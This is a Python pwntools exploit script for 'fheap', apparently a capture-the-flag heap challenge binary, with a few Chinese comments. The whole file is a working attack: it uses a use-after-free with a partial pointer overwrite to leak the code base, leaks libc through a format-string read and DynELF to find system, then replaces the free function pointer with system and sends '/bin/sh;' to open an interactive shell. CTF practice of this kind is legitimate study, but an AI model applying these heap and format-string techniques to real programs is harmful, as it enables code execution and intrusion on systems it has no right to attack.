#coding=utf-8
from pwn import*
from ctypes import *
context(os='linux',arch='amd64')
context.log_level = 'debug'
# gdb.attach(p)
# pause()

DEBUG = 1
if DEBUG:
	 p = process('./fheap')
else:
	 p = remote('', 66666)

elf = ELF('./fheap')
def pr(a,addr):
	log.success(a+': '+hex(addr))

printf_plt = 0

def create(size,content):
	p.recvuntil("quit")
	p.send("create ")
	p.recvuntil("size:")
	p.sendline(str(size))
	p.recvuntil('str:')
	p.send(content.ljust(size,'\x00'))
	p.recvuntil('n')[:-1]

def delete(idx):
	p.recvuntil("quit")
	p.sendline("delete ")
	p.recvuntil('id:')
	p.send(str(idx)+'\n')
	p.recvuntil('sure?:')
	p.send('yes '+'\n')

def leak(addr):
	delete(0)
	data = 'aa%9$s' + '#'*(0x18 - len('aa%9$s')) + p64(printf_plt)
	create(0x20, data)
	p.recvuntil("quit")
	p.send("delete ")
	p.recvuntil('id:')
	p.send(str(1) + '\n')
	p.recvuntil('sure?:')
	p.send('yes01234' + p64(addr))
	p.recvuntil('aa')
	data = p.recvuntil('####')[:-4]
	data += "\x00"
	return data


create(4,'aa')
create(4,'bb')
create(4,'cc')   
delete(2)
delete(1)
delete(0)

# gdb.attach(p)
# pause()
data = 'a' * 0x10 + 'b' * 0x8 + '\x2d' + '\x00'
create(0x20, data)
# gdb.attach(p)
# pause()

delete(1) #调用puts函数
p.recvuntil('b' * 0x8)
data = p.recvline()[:-1]

if len(data) > 8:
	data = data[:8]
data = u64(data.ljust(8,'\x00'))
codebase = data - 0xd2d
printf_plt = codebase + 0x9d0
pr('codebase',codebase)
pr('printf_plt',printf_plt)
# gdb.attach(p)
# pause()
delete(0)
# gdb.attach(p)
# pause()
#part2
data = 'a' * 0x10 + 'b'*0x8 + '\x2d' + '\x00'
create(0x20, data)
# gdb.attach(p)
# pause()
delete(1)
p.recvuntil('b'*0x8)
data = p.recvline()[:-1]
gdb.attach(p)
pause()
d = DynELF(leak, codebase, elf=ELF('./fheap'))
system_addr = d.lookup('system', 'libc')
pr('system_addr',system_addr)

#用system函数覆盖free函数
delete(0)
data = '/bin/sh;' + '#' * (0x18 - len('/bin/sh;')) + p64(system_addr)
create(0x20, data)
delete(1)
p.interactive()
